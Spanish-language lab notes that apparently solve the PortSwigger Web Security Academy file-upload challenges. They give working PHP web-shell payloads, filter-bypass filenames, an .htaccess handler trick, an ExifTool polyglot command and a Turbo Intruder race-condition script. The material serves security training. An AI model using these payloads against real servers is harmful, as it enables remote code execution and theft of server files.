
## Remote code execution via web shell upload

La plataforma permite subir cualquier tipo de archivo el cual se guarda de forma estática lo cual permite ejecutar código malicioso que  pueda mostrar información relevante del servidor.
> `<?php echo file_get_contents('/path/to/target/file'); ?>`

## Web shell upload via Content-Type restriction bypass

La plataforma no permitía subir ciertos tipos de datos tales como `application/octet-stream` dentro de un FormData, sin embargo se puede cambiar el tipo de dato aunque este no coincida con el del archivo para burlar el filtro. 
> `Content-Type: image/jpeg`

## Web shell upload via path traversal
La plataforma realizaba la subida de imágenes con un tipo de contenido de `Form Data`, el cual sin control permite escoger la dirección de donde se guardara el archivo, esto con el objetivo de burlar la seguridad que pueda tener el directorio por defecto.

> `Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"`

## Web shell upload via extension blacklist bypass
De primeras la plataforma no permite subir archivos que terminen con una extensión `.php`, por lo tanto se hará uso de un archivo perteneciente a Apache (`.htaccess`) que permite ejecutar archivos con extensiones diferentes como si de un archivo php se tratara.

Cambiar el contenido del `Form Data` de la petición
```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain.

AddType application/x-httpd-php .l33t
```

Posteriormente sera necesario cambiar la extensión del archivo exploit a `.l33t`


## Web shell upload via obfuscated file extension
Es posible ocultar la extension del archivo de diferentes formas:
- En el caso de no ser *Case Sensitive* se puede usar `exploit.pHp`
- Agregar múltiples extensiones `exploit.php.jpg`
- Agregar caracteres finales `exploit.php.`
- usar URL encoding `exploit%2Ephp`
- URL Encoding NULL antes de la extensión `exploit.asp%00.jpg`
- Agregar Punto y coma antes de la extensión `exploit.asp;.jpg`
- Intente usar caracteres Unicode de varios bytes, que pueden convertirse en bytes nulos y puntos después de la conversión o normalización de Unicode. `xC0 x2E, xC4 xAE or xC0 xAE ` puede ser convertido a `x2E`.
- Ante remplazo de Extensión `exploit.p.phphp`, lo cual quitando `.php` queda `exploit.php`

## Remote code execution via polyglot web shell upload
Usando herramientas especiales, como ExifTool, puede ser trivial crear un archivo JPEG políglota que contenga código malicioso dentro de sus metadatos.

Cree un archivo PHP/JPG políglota que sea fundamentalmente una imagen normal, pero que contenga su carga útil de PHP en sus metadatos. Una forma sencilla de hacerlo es descargar y ejecutar ExifTool desde la línea de comandos de la siguiente manera
> `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

## Web shell upload via race condition
El archivo subido se mueve a una carpeta accesible temporalmente, donde se comprueba si tiene virus. Los archivos maliciosos solo se eliminan una vez que se completa la verificación de virus. Esto significa que es posible ejecutar el archivo en la pequeña ventana de tiempo antes de que se elimine.

Para esto se hace uso del siguiente código en el `turbo intruder`

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: 0a1c00210491d909c0136fea006c00d5.web-security-academy.net
Cookie: session=SUIPdTkzWvf5m3B8Tr7d194WLnUnZWws
Content-Length: 477
Cache-Control: max-age=0
Sec-Ch-Ua: "Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a1c00210491d909c0136fea006c00d5.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5CcG81EuLU4SMnDa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1c00210491d909c0136fea006c00d5.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary5CcG81EuLU4SMnDa
Content-Disposition: form-data; name="avatar"; filename="exploit2.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary5CcG81EuLU4SMnDa
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary5CcG81EuLU4SMnDa
Content-Disposition: form-data; name="csrf"

VXyCUqF2WxLDMkEnMF801NuISqVWAEkS
------WebKitFormBoundary5CcG81EuLU4SMnDa--
    '''

    request2 = '''
GET /files/avatars/exploit2.php HTTP/1.1
Host: 0a1c00210491d909c0136fea006c00d5.web-security-academy.net
Cookie: session=SUIPdTkzWvf5m3B8Tr7d194WLnUnZWws
Cache-Control: max-age=0
Sec-Ch-Ua: "Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1c00210491d909c0136fea006c00d5.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

    '''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```